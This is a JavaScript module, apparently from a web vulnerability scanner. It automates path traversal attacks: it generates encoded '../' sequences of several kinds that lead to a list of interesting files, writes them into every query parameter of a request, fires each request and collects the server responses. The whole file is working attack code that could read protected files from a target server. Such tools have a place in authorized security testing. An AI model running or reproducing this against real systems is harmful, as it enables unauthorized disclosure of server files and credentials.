import { setup_response } from "../utils/methods.js";
import { interestingFiles } from "../utils/vars.js";

export default async function get_filepath(request) {
  let results = [];
  let fetchList = [];
  let lstOfAttacks = [];

  const x = 10;
  // for (let x = 0; x < 10; x++) {
  for (let file in interestingFiles) {
    lstOfAttacks.push(`${"../".repeat(x)}${interestingFiles[file]}`);
    lstOfAttacks.push(`${"....//".repeat(x)}${interestingFiles[file]}`);
    lstOfAttacks.push(`${"%2e%2e%2f".repeat(x)}${interestingFiles[file]}`);
    lstOfAttacks.push(
      `${"%2e%2e%2e%2e%2f%2f".repeat(x)}${interestingFiles[file]}`
    );
    lstOfAttacks.push(`${"..%252f".repeat(x)}${interestingFiles[file]}`);
    // }
  }

  // console.log(lstOfAttacks);

  for (let index = 0; index < lstOfAttacks.length; index++) {
    const attack = lstOfAttacks[index];

    const theUrl = request.url.split("?")[0];

    const params = request.url.split("?")[1].split("&");

    let newUrl = `${theUrl}?`;

    params.forEach((element) => {
      newUrl += `${element.split("=")[0]}=${attack}&`;
    });

    // setup the attack with the payload

    fetchList.push(`await fetch('${newUrl}', {
      method: '${request.method}',
    }).then((x) => x.text())`);

    await fetch(`${newUrl}`, {
      method: `${request.method}`,
    })
      .catch((e) => console.log("errordonotcare"))
      .then((x) => x.text())
      .then((x) => results.push(x));
  }

  setup_response(request, results, fetchList);
}
